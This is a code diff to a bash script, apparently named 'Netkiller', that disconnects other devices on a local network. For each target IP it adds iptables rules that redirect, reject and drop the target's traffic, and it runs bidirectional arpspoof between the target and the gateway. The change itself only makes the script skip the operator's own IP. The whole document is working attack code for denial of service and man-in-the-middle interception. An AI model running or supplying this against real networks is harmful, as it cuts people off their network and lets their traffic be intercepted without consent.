@@ -73,19 +73,24 @@ if [[ $NETWORK_CIDR =~ "," ]]; then
     for IP in "${TARGET_IPS[@]}"; do
         IP=$(echo "$IP" | tr -d '[:space:]') # Trim whitespace
         if is_valid_ip "$IP"; then
-            # Drop all packets except your IP source and destination (bidirectional)
-            sudo iptables -t nat -I PREROUTING -s "$IP" -j DNAT --to-destination "$GATEWAY"
-            sudo iptables -I FORWARD -s "$IP" -p tcp -j REJECT --reject-with tcp-reset
-            sudo iptables -I FORWARD -s "$IP" -p udp -j REJECT --reject-with icmp-port-unreachable
-            sudo iptables -I FORWARD -s "$IP" -p icmp -j REJECT --reject-with icmp-host-unreachable
-            sudo iptables -I FORWARD -s "$IP" -j DROP
+            # Skip if this is our own IP
+            if [ "$IP" != "$MYIP" ]; then
+                # Drop all packets except your IP source and destination (bidirectional)
+                sudo iptables -t nat -I PREROUTING -s "$IP" -j DNAT --to-destination "$GATEWAY"
+                sudo iptables -I FORWARD -s "$IP" -p tcp -j REJECT --reject-with tcp-reset
+                sudo iptables -I FORWARD -s "$IP" -p udp -j REJECT --reject-with icmp-port-unreachable
+                sudo iptables -I FORWARD -s "$IP" -p icmp -j REJECT --reject-with icmp-host-unreachable
+                sudo iptables -I FORWARD -s "$IP" -j DROP
 
-            # Bidirectional ARP spoofing
-        (
-            arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
-            arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
-        ) &    
-            echo "Netkiller kill the IP: $IP"
+                # Bidirectional ARP spoofing
+                (
+                    arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
+                    arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
+                ) &    
+                echo "Netkiller kill the IP: $IP"
+            else
+                echo "Skipping our own IP: $IP"
+            fi
         else
             echo "Invalid IP address: $IP. Skipping..."
         fi
@@ -113,18 +118,23 @@ else
     for (( i = MIN; i <= MAX; i++ )); do
         IP=$(dec2ip "$i")
 
-        # Drop all packets except your IP source and destination (bidirectional)
-        sudo iptables -t nat -I PREROUTING -s "$IP" -j DNAT --to-destination "$GATEWAY"
-        sudo iptables -I FORWARD -s "$IP" -p tcp -j REJECT --reject-with tcp-reset
-        sudo iptables -I FORWARD -s "$IP" -p udp -j REJECT --reject-with icmp-port-unreachable
-        sudo iptables -I FORWARD -s "$IP" -p icmp -j REJECT --reject-with icmp-host-unreachable
-        sudo iptables -I FORWARD -s "$IP" -j DROP
-        
-        # Bidirectional ARP spoofing
-    (
-        sudo arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
-        sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
-    ) &
+        # Skip if this is our own IP
+        if [ "$IP" != "$MYIP" ]; then
+            # Drop all packets except your IP source and destination (bidirectional)
+            sudo iptables -t nat -I PREROUTING -s "$IP" -j DNAT --to-destination "$GATEWAY"
+            sudo iptables -I FORWARD -s "$IP" -p tcp -j REJECT --reject-with tcp-reset
+            sudo iptables -I FORWARD -s "$IP" -p udp -j REJECT --reject-with icmp-port-unreachable
+            sudo iptables -I FORWARD -s "$IP" -p icmp -j REJECT --reject-with icmp-host-unreachable
+            sudo iptables -I FORWARD -s "$IP" -j DROP
+            
+            # Bidirectional ARP spoofing
+            (
+                sudo arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
+                sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
+            ) &
+        else
+            echo "Skipping our own IP: $IP"
+        fi
     done
 fi
 
